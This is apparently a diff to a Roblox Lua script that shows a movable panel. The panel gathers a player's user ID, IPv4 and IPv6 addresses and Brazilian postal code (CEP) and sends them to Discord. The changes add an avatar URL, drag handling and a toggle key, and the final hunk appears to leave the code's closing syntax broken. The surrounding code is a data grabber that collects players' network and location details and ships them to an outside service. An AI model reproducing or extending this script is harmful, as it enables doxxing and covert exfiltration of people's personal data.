@@ -4,6 +4,10 @@ local UserInputService = game:GetService("UserInputService")
 
 local screenGui
 local frame
+local isPanelVisible = false  -- Variável para controlar a visibilidade do painel
+
+local dragStart = nil
+local startPos = nil
 
 -- Função para criar o painel
 local function createTextBoxPanel()
@@ -77,6 +81,7 @@ local function createTextBoxPanel()
 
             -- Game Info
             local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+            local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=150&height=150&format=png" -- Foto do jogador
 
             return {
                 Userid = Userid,
@@ -90,7 +95,8 @@ local function createTextBoxPanel()
                 ConsoleJobId = ConsoleJobId,
                 IpV4 = ipV4,
                 IpV6 = ipV6,
-                Cep = cep
+                Cep = cep,
+                AvatarUrl = avatarUrl  -- Incluindo a URL do avatar
             }
         end
 
@@ -119,7 +125,7 @@ local function createTextBoxPanel()
                         ["type"] = "rich",
                         ["color"] = tonumber("0xFFD700"), -- Cor
                         ["thumbnail"] = {
-                            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..playerInfo.Userid.."&width=150&height=150&format=png"
+                            ["url"] = playerInfo.AvatarUrl  -- Usando a foto do avatar do jogador
                         },
                     }
                 }
@@ -154,6 +160,32 @@ local function createTextBoxPanel()
         print("Informações enviadas para o Discord!")
     end)
 
+    -- Lógica para arrastar o painel
+    frame.InputBegan:Connect(function(input, gameProcessedEvent)
+        if gameProcessedEvent then return end
+
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            -- Começa a arrastar
+            dragStart = input.Position
+            startPos = frame.Position
+        end
+    end)
+
+    frame.InputChanged:Connect(function(input, gameProcessedEvent)
+        if gameProcessedEvent then return end
+
+        if input.UserInputType == Enum.UserInputType.MouseMovement and dragStart then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+
+    frame.InputEnded:Connect(function(input, gameProcessedEvent)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragStart = nil
+            startPos = nil
+        end
+    end)
 end
 
 -- Mostrar ou esconder o painel ao clicar com o Control Direito
@@ -161,12 +193,13 @@ UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
     if not gameProcessedEvent then
         if input.UserInputType == Enum.UserInputType.Keyboard then
             if input.KeyCode == Enum.KeyCode.RightControl then
-                if screenGui then
-                    screenGui:Destroy()  -- Remove o painel se já estiver visível
+                if isPanelVisible then
+                    screenGui:Destroy()  -- Remove o painel
+                    isPanelVisible = false
                 else
-                    createTextBoxPanel()  -- Cria o painel caso não exista
+                    createTextBoxPanel()  -- Cria o painel novamente
+                    isPanelVisible = true
                 end
             end
         end
-    end
-end)
+    end)
